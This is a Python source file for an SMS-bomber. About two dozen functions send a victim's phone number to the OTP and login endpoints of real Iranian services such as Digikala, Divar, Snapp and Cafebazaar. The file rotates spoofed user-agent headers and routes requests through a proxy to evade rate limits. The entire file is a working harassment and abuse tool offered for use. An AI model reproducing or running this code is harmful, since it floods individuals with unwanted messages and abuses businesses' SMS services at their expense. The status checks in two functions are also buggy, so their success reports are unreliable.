import requests
from time import sleep
import random

heads = [
    {
        'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
        'accept': 'application/json, text/plain, */*',
    },
    {
        'user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36',
        'accept': 'application/json, text/plain, */*',
    },
    {
        'user-agent':'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
        'accept': 'application/json, text/plain, */*',
    },
    {
        'user-agent':'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
        'accept': 'application/json, text/plain, */*',
    },
    {
        'user-agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9',
        'accept': 'application/json, text/plain, */*',
    },
    {
        'user-agent':'Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4',
        'accept': 'application/json, text/plain, */*',
    },
    {
        'user-agent':'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
        'accept': 'application/json, text/plain, */*',
    },
    {
        'user-agent':'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
        'accept': 'application/json, text/plain, */*',
    },
    {
        'user-agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.5.17 (KHTML, like Gecko) Version/8.0.5 Safari/600.5.17',
        'accept': 'application/json, text/plain, */*',
    },
    {
        'user-agent':'Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53',
        'accept': 'application/json, text/plain, */*',
    },
    {
        'user-agent':'Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; rv:11.0) like Gecko',
        'accept': 'application/json, text/plain, */*',
    },
    {
        'user-agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:40.0) Gecko/20100101 Firefox/40.0',
        'accept': 'application/json, text/plain, */*',
    },
    {
        'user-agent':'Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3',
        'accept': 'application/json, text/plain, */*',
    },
    {
        'user-agent':'Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/8.0.57838 Mobile/12H321 Safari/600.1.4',
        'accept': 'application/json, text/plain, */*',
    },
]

proxy = {"https": "127.0.0.1:8000"}

def bama_bomber(number):
    random_choose = random.choice(heads)
    bama_api = 'https://account.bama.ir/api/otp/Generate/v2'
    json_request_api = {"cellNumber":"0"+number,"appname":"popuplogin","smsfor":6}
    try:
        req = requests.post(bama_api,json=json_request_api,headers=random_choose,proxies=proxy)
        if req.status_code == 200:
            print('bama Code Sent!')
        else:
            print(f"bama code: {req.status_code}")
    except:
        print('bama error!')

def barghman_bomber(number):
    random_choose = random.choice(heads)
    barghman_api = 'https://uiapi2.saapa.ir/api/otp/sendCode'
    json_request_api = {"mobile":"0"+number,"from_meter_buy":False}
    try:
        req = requests.post(barghman_api,json=json_request_api,headers=random_choose,proxies=proxy)
        if req.status_code == 200:
            print('barghman Code Sent!')
        else:
            print(f"barghman code: {req.status_code}")
    except:
        print('barghman error!')

def digikala_bomber(number):
    random_choose = random.choice(heads)
    digikala_api = 'https://api.digikala.com/v1/user/authenticate/'
    json_request_api = {"backUrl":"/","username":number,"otp_call":"false"}
    try:
        req = requests.post(digikala_api,json=json_request_api,headers=random_choose,proxies=proxy)
        if req.status_code == 200:
            print('digikala Code Sent!')
        else:
            print(f"digikala code: {req.status_code}")
    except:
        print('digikala error!')

def divar_bomber(number):
    random_choose = random.choice(heads)
    divar_api = 'https://api.divar.ir/v5/auth/authenticate'
    json_request_api = {"phone":number}
    try:
        req = requests.post(divar_api,json=json_request_api,headers=random_choose,proxies=proxy)
        if req.status_code == 200:
            print('divar Code Sent!')
        else:
            print(f"divar code: {req.status_code}")
    except:
        print('divar error!')

def emtiaz_bomber(number):
    random_choose = random.choice(heads)
    emtiaz_api = "https://api.zarinplus.com/user/zarinpal-login"
    json_request_api = {"phone_number":"98"+number,"source":"zarinplus"}
    try:
        req = requests.post(emtiaz_api,json=json_request_api,headers=random_choose,proxies=proxy)
        if req.status_code == 200:
            print('emtiaz Code Sent!')
        else:
            print(f"emtiaz code: {req.status_code}")
    except:
        print('emtiaz error!')

def gap_bomber(number):
    random_choose = random.choice(heads)
    gap_api = 'https://core.gap.im/v1/user/add.json?mobile=%2B98'+number
    try:
        req = requests.get(gap_api,headers=random_choose,proxies=proxy)
        if req.status_code == 200:
            print('gap Code Sent!')
        else:
            print(f"gap code: {req.status_code}")
    except:
        print('gap error!')

def lenz_bomber(number):
    random_choose = random.choice(heads)
    lenz_api = 'https://api-v3.lenz.ir/api/v3/user-management/otp/register'
    json_request_api = {"msisdn":"98"+number}
    try:
        req = requests.post(lenz_api,json=json_request_api,headers=random_choose,proxies=proxy)
        if req.status_code == 200:
            print('lenz Code Sent!')
        else:
            print(f"lenz code: {req.status_code}")
    except:
        print('lenz error!')

def sheypoor_bomber(number):
    random_choose = random.choice(heads)
    sheypoor_api = 'https://www.sheypoor.com/api/v10.0.0/auth/send'
    json_request_api = {"username":number}
    try:
        req = requests.post(sheypoor_api,json=json_request_api,headers=random_choose,proxies=proxy)
        if req.status_code == 200:
            print('sheypoor Code Sent!')
        else:
            print(f"sheypoor code: {req.status_code}")
    except:
        print('sheypoor error!')

def snap_bomber(number):
    random_choose = random.choice(heads)
    snap_api = 'https://app.snapp.taxi/api/api-passenger-oauth/v2/otp'
    json_request_api = {"cellphone":number}
    try:
        req = requests.post(snap_api,json=json_request_api,headers=random_choose,proxies=proxy)
        if req.status_code == 200:
            print('snap Code Sent!')
        else:
            print(f"snap code: {req.status_code}")
    except:
        print('snap error!')

def tapsi_bomber(number):
    random_choose = random.choice(heads)
    tapsi_api = 'https://tap33.me/api/v2/user'
    json_request_api = {"credential":{"phoneNumber":number,"role":"DRIVER"}}
    try:
        req = requests.post(tapsi_api,json=json_request_api,headers=random_choose,proxies=proxy)
        if req.status_code == 200:
            print('tapsi Code Sent!')
        else:
            print(f"tapsi code: {req.status_code}")
    except:
        print('tapsi error!')

def torob_bomber(number):
    random_choose = random.choice(heads)
    torob_api = 'https://api.torob.com/a/phone/send-pin/?phone_number=0'+number
    try:
        req = requests.get(torob_api,headers=random_choose,proxies=proxy)
        if req.status_code == 200:
            print('torob Code Sent!')
        else:
            print(f"torob code: {req.status_code}")
    except:
        print('torob error!')

def pinorest_bomber(number):
    random_choose = random.choice(heads)
    pinorest_api = 'https://api.pinorest.com/frontend/auth/login/mobile'
    json_request_api = {"mobile":"0"+number}
    try:
        req = requests.post(pinorest_api,json=json_request_api,headers=random_choose,proxies=proxy)
        if req.status_code == 200:
            print('pinorest code sent!')
        else:
            print(f'pinorest code: {req.status_code}')
    except:
        print('pinorest error!')

def hamrahmechanic_bomber(number):
    random_choose = random.choice(heads)
    hamrahm_api = 'https://www.hamrah-mechanic.com/api/v1/membership/otp'
    json_request_api = {"PhoneNumber":"0"+number,"prevDomainUrl":"https://www.google.com/","landingPageUrl":"https://www.hamrah-mechanic.com/","orderPageUrl":"https://www.hamrah-mechanic.com/membersignin/","prevUrl":"https://www.hamrah-mechanic.com/","referrer":"https://www.google.com/"}
    try:
        req = requests.post(hamrahm_api,json=json_request_api,headers=random_choose,proxies=proxy)
        if req.status_code == 200:
            print('hamrahmechanic code sent!')
        else:
            print(f'hamrahmechanic code: {req.status_code}')
    except:
        print('hamrahmechanic error!')

def mobit_bomber(number):
    random_choose = random.choice(heads)
    mobit_api = 'https://api.mobit.ir/api/web/v8/register/register'
    mobit_api2 = 'https://api.mobit.ir/api/web/v6/register/login'
    json_request_api = {"number":"0"+number}
    try:
        req = requests.post(mobit_api,json=json_request_api,headers=random_choose,proxies=proxy)
        req2 = requests.post(mobit_api2,json=json_request_api,headers=random_choose,proxies=proxy)
        if req2.status_code or req.status_code == 200:
            print('mobit code sent!')
        else:
            print(f'mobit code: {req.status_code}')
    except:
        print('mobit error!')

def jabama_bomber(number):
    random_choose = random.choice(heads)
    jabama_api = 'https://taraazws.jabama.com/api/v4/account/send-code'
    json_request_api = {"mobile":"0"+number}
    try:
        req = requests.post(jabama_api,json=json_request_api,headers=random_choose,proxies=proxy)
        if req.status_code == 200:
            print('jabama code sent!')
        else:
            print(f'jabama code: {req.status_code}')
    except:
        print('jabama error!')

def drdr_bomber(number):
    random_choose = random.choice(heads)
    drdr_api = 'https://drdr.ir/api/registerEnrollment/verifyMobile'
    drdr_calapi = 'https://drdr.ir/api/registerEnrollment/register/call-code'
    json_request_api = {"phoneNumber":number,"userType":"PATIENT"}
    try:
        req = requests.post(drdr_api,json=json_request_api,headers=random_choose,proxies=proxy)
        req_call = requests.post(drdr_calapi,json=json_request_api,headers=random_choose,proxies=proxy)
        
        if req_call.status_code or req.status_code == 200:
            print('drdr code sent!')
        else:
            print(f'drdr code: {req.status_code}')
    except:
        print('drdr error!')

def gabzino_bomber(number):
    random_choose = random.choice(heads)
    gabzino_api = 'https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode'
    json_request_api = {"Parameters":{"ApplicationType":"Web","ApplicationUniqueToken":None,"ApplicationVersion":"1.0.0","MobileNumber":"0"+number,"UniqueToken":None}}
    try:
        req = requests.post(gabzino_api,json=json_request_api,headers=random_choose,proxies=proxy)
        if req.status_code == 200:
            print('gabzino code sent!')
        else:
            print(f'gabzino code: {req.status_code}')
    except:
        print('gabzino error!')

def pinket_bomber(number):
    random_choose = random.choice(heads)
    pinket_api = 'https://pinket.com/api/cu/v2/phone-verification'
    json_request_api = {"phoneNumber":"0"+number}
    try:
        req = requests.post(pinket_api,json=json_request_api,headers=random_choose,proxies=proxy)
        if req.status_code == 200:
            print('pinket code sent!')
        else:
            print(f'pinket code: {req.status_code}')
    except:
        print('pinket error!')

def digijet_bomber(number):
    random_choose = random.choice(heads)
    digijet_api = 'https://api.digikalajet.ir/user/login-register/'
    json_request_api = {"phone":"0"+number}
    try:
        req = requests.post(digijet_api,json=json_request_api,headers=random_choose,proxies=proxy)
        if req.status_code == 200:
            print('digijet code sent!')
        else:
            print(f'digijet code: {req.status_code}')
    except:
        print('digijet error!')

def cafebazaar_bomber(number):
    random_choose = random.choice(heads)
    cafebazaar_api = 'https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest'
    json_request_api = {"properties":{"language":2,"clientID":"vovnbz5nmw734et4oi7xcg19j69h9cha","deviceID":"vovnbz5nmw734et4oi7xcg19j69h9cha","clientVersion":"web"},"singleRequest":{"getOtpTokenRequest":{"username":"98"+number}}}
    try:
        req = requests.post(cafebazaar_api,json=json_request_api,headers=random_choose,proxies=proxy)
        if req.status_code == 200:
            print('cafebazaar code sent!')
        else:
            print(f'cafebazaar code: {req.status_code}')
    except:
        print('cafebazaar error!')

def lidoma_bomber(number):
    random_choose = random.choice(heads)
    lidoma_api = 'https://lidomatrip.com/user/signup/send_code'
    json_request_api = {"jsonrpc":"2.0","method":"call","params":{"phone_number":"0"+number,"action":"signin"},"id":82926985}
    try:
        req = requests.post(lidoma_api,json=json_request_api,headers=random_choose,proxies=proxy)
        if req.status_code == 200:
            print('lidoma code sent!')
        else:
            print(f'lidoma code: {req.status_code}')
    except:
        print('lidoma error!')

def vandar_bomber(number):
    random_choose = random.choice(heads)
    vandar_api = 'https://api.vandar.io/account/v1/check/mobile'
    json_request_api = {"mobile":"0"+number}
    try:
        req = requests.post(vandar_api,json=json_request_api,headers=random_choose,proxies=proxy)
        if req.status_code == 200:
            print('vandar code sent!')
        else:
            print(f'vandar code: {req.status_code}')
    except:
        print('vandar error!')

def taaghche_bomber(number):
    random_choose = random.choice(heads)
    taaghche_api = 'https://gw.taaghche.com/v4/site/auth/signup'
    json_request_api = {"contact":"0"+number}
    try:
        req = requests.post(taaghche_api,json=json_request_api,headers=random_choose,proxies=proxy)
        if req.status_code == 200:
            print('taaghche code sent!')
        else:
            print(f'taaghche code: {req.status_code}')
    except:
        print('taaghche error!')

def flightio_bomber(number):
    random_choose = random.choice(heads)
    flightio_api = 'https://flightio.com/bff/Authentication/CheckUserKey'
    json_request_api = {"userKey":"98-"+number,"userKeyType":1}
    try:
        req = requests.post(flightio_api,json=json_request_api,headers=random_choose,proxies=proxy)
        if req.status_code == 200:
            print('flightio code sent!')
        else:
            print(f'flightio code: {req.status_code}')
    except:
        print('flightio error!')

def karnameh_bomber(number):
    random_choose = random.choice(heads)
    karnameh_api = 'https://api.karnameh.com/v1/carinspection/auth/authenticate'
    json_request_api = {"phone":"0"+number}
    try:
        req = requests.post(karnameh_api,json=json_request_api,headers=random_choose,proxies=proxy)
        if req.status_code == 200:
            print('karnameh code sent!')
        else:
            print(f'karnameh code: {req.status_code}')
    except:
        print('karnameh error!')

def bit24_bomber(number):
    random_choose = random.choice(heads)
    bit24_api = 'https://bit24.cash/api/auth/check-mobile'
    json_request_api = {"mobile":"0"+number}
    try:
        req = requests.post(bit24_api,json=json_request_api,headers=random_choose,proxies=proxy)
        if req.status_code == 200:
            print('bit24 code sent!')
        else:
            print(f'bit24 code: {req.status_code}')
    except:
        print('bit24 error!')